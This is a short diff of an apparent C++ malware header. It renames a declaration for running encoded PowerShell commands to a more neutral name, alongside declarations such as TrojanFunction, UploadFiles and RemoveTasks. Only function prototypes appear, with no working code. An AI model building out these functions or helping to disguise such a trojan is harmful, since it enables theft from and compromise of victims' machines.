@@ -69,7 +69,7 @@ void UploadFiles(const std::vector<std::string>& files);
 std::vector<std::string> GetLinks();
 
 // security.cpp
-std::string RunPSEncCommand(const std::string& cmd);
+std::string RunEncCommand(const std::string& cmd);
 std::string GenerateRandom(const int len);
 DWORD TrojanFunction(LPVOID url);
 DWORD RemoveTasks(LPVOID params_useless);
